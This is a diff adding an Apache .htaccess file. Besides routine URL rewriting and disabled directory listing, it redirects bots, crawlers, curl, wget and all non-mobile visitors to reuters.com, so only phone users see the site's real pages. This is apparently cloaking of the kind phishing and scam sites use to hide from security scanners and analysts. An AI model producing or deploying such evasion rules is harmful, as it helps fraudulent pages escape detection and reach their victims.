@@ -1,0 +1,12 @@
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule ^([^\.]+)$ $1.php [NC,L]
+
+RewriteCond %{HTTP_USER_AGENT} (bot|crawler|spider|curl|wget) [NC]
+RewriteRule ^ https://www.reuters.com/ [R=302,L]
+
+RewriteCond %{HTTP_USER_AGENT} !(iPhone|Android|webOS|iPod|iPad|BlackBerry|Opera\ Mini|IEMobile) [NC]
+RewriteRule ^ https://www.reuters.com/ [R=302,L]
+
+
+Options -Indexes
